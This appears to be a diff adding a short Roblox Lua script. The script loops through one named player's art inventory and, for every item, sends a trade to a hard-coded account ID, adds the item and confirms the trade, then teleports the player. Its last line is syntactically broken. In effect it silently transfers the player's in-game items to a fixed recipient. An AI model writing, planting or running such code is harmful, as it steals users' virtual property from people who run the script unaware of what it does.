@@ -1,0 +1,33 @@
+task.wait(9)
+for i,v in pairs(game:GetService("Players").yk_ts.PlayerGui.MainUI.Frames.Art.ArtInventory:GetChildren()) do
+    for m,n in pairs(v:GetChildren()) do
+        if n:IsA("TextLabel") then
+            local args = {
+                [1] = "TradeRequest",
+                [2] = {
+                    [1] = 387516382
+                }
+            }
+            
+            game:GetService("ReplicatedStorage").Packages.Knit.Services.TradeService.RF.ServerTrade:InvokeServer(unpack(args))
+            task.wait(2)
+            local args = {
+                [1] = "TradeAddArt",
+                [2] = {
+                    [1] = n.Parent.Name
+                }
+            }
+            
+            game:GetService("ReplicatedStorage").Packages.Knit.Services.TradeService.RF.ServerTrade:InvokeServer(unpack(args))
+            task.wait(0.3)
+            local args = {
+                [1] = "TradeReady",
+                [2] = {}
+            }
+            
+            game:GetService("ReplicatedStorage").Packages.Knit.Services.TradeService.RF.ServerTrade:InvokeServer(unpack(args))
+        end
+    end
+end
+task.wait(8)
+game:GetService("TeleportService:")Teleport(PlaceId, game.Players.LocalPlayer)
